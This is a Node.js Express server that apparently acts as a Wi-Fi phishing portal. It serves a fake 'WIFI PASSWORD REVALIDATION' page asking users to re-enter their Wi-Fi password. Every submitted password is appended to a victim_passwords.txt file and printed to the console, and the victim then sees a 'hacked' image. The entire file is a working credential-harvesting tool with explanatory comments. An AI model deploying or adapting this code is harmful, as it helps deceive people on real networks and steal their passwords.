// The web server
const express = require('express')
const app = express()
// The port the web server listen to
const port = 80
// Working with files
const fs = require('fs');
// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))
app.use(express.static(__dirname + "/public"));



// The HTML page that is presented to the client
const presentHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Authentication</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #FFFFF00;
      padding: 20px;
     
    }
    button{
            padding: 10px;
      }
      #connecting{
            visibility: hidden;
      }

  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="wifi-icon3.png" width="180vw">
      
      <p>Wifi passowrd needs to be revalidate for security purposes.</p> 

	  <form method="post" action="password" id="mform">
		<p>Please enter your password: </p>
		<input type="text" name="password" size="35%">
		<passwordp><input type="submit" name="button"  value="CONNECT"></p>
	  </form> 
  </div>
	
</body>
</html>`;
 
const presentHackedHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Authentication</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #FFFFF00;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="hacked2.gif" alt="" width="180vw">

  </div>
	
</body>
</html>`;

app.get('/', (req, res) => {
    // Print message to the server side
    console.log(`The victim attempted to access a website\n`);
    // Response - return the HTML page 
    res.send(presentHTML('WIFI PASSWORD REVALIDATION')); 
});


app.post('/password', (req, res) => {
    // In POST request the password  that the client entered is in the body 
    const password = req.body.password;
    // Write the given password in the 'victim_password.txt' file 
    fs.appendFileSync('victim_passwords.txt', `victim_password : ${password} \n`);
    //print the victim password in the server terminal 
    console.log(`The victim entered a password : ${password} `);
    res.send(presentHackedHTML(''));
});

// Define the port that the web server will listen to
app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
